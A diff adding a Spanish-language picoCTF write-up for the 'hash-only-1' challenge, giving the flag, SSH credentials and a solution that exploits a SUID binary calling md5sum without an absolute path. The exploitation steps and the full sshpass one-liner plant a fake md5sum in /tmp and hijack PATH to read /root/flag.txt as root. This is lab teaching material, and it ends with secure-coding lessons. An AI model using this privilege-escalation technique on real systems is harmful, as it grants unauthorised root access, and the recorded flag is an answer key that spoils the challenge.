@@ -1,0 +1,76 @@
+HASH-ONLY-1 - picoCTF - SOLUCIONADO
+====================================
+
+FLAG: picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_bb95ff8e}
+
+SSH: ssh ctf-player@shape-facility.picoctf.net -p 61383
+Password: 483e80d4
+
+RESUMEN DE LA SOLUCIÓN:
+-----------------------
+
+1. RECONOCIMIENTO:
+   - Conexión SSH al servidor con las credenciales proporcionadas
+   - Binario SUID ubicado en: ~/flaghasher (directorio home)
+   - El binario tiene permisos: -rwsr-xr-x (se ejecuta como root)
+   - BuildID: c4fbd07a602b4570abdcfe273078247bdc96b5b2 (mismo que hash-only-2)
+
+2. ANÁLISIS DEL BINARIO:
+   - Tipo: ELF 64-bit LSB, not stripped
+   - Análisis con strings reveló el comando ejecutado:
+     `/bin/bash -c 'md5sum /root/flag.txt'`
+   - El binario usa setuid(0) y setgid(0) para ejecutar como root
+   - Ejecuta system() con md5sum SIN ruta absoluta
+   - Hash MD5 original: 7779dbbe8c1228e3a7a3970faa41a89c
+
+3. VULNERABILIDAD IDENTIFICADA:
+   - PATH Hijacking / Command Injection
+   - El binario ejecuta "md5sum" sin ruta absoluta (/usr/bin/md5sum)
+   - Permite manipular el PATH para ejecutar un "md5sum" malicioso
+   - Es el MISMO binario que hash-only-2, pero en diferente ubicación
+
+4. EXPLOTACIÓN:
+   
+   Paso 1: Crear script malicioso en /tmp (tiene permisos de escritura)
+   ```bash
+   echo "#!/bin/bash" > /tmp/md5sum
+   echo "cat /root/flag.txt" >> /tmp/md5sum
+   chmod +x /tmp/md5sum
+   ```
+   
+   Paso 2: Modificar PATH y ejecutar flaghasher
+   ```bash
+   export PATH=/tmp:$PATH
+   ./flaghasher
+   ```
+
+5. RESULTADO:
+   - El binario ejecutó nuestro script malicioso /tmp/md5sum
+   - Como tiene SUID root, el script se ejecutó con privilegios de root
+   - Obtuvo el contenido de /root/flag.txt en lugar del hash MD5
+
+COMANDO COMPLETO DE EXPLOTACIÓN:
+---------------------------------
+sshpass -p '483e80d4' ssh -o StrictHostKeyChecking=no \
+  ctf-player@shape-facility.picoctf.net -p 61383 \
+  "echo '#!/bin/bash' > /tmp/md5sum && \
+   echo 'cat /root/flag.txt' >> /tmp/md5sum && \
+   chmod +x /tmp/md5sum && \
+   export PATH=/tmp:\$PATH && \
+   ./flaghasher"
+
+DIFERENCIAS CON HASH-ONLY-2:
+-----------------------------
+- hash-only-1: Binario en ~/flaghasher (directorio home del usuario)
+- hash-only-2: Binario en /usr/local/bin/flaghasher (binario global)
+- Ambos: MISMO binario (BuildID idéntico), misma vulnerabilidad
+- Diferencia: Solo la ubicación del archivo
+
+LECCIONES APRENDIDAS:
+---------------------
+1. Los binarios SUID deben usar rutas absolutas para ejecutar comandos
+2. Nunca ejecutar comandos externos con system() usando rutas relativas
+3. PATH hijacking es una técnica común para escalar privilegios
+4. La variable PATH se puede manipular para ejecutar código arbitrario
+5. Los binarios deben sanitizar el entorno antes de ejecutar comandos externos
+6. La ubicación del binario no importa si la vulnerabilidad es la misma
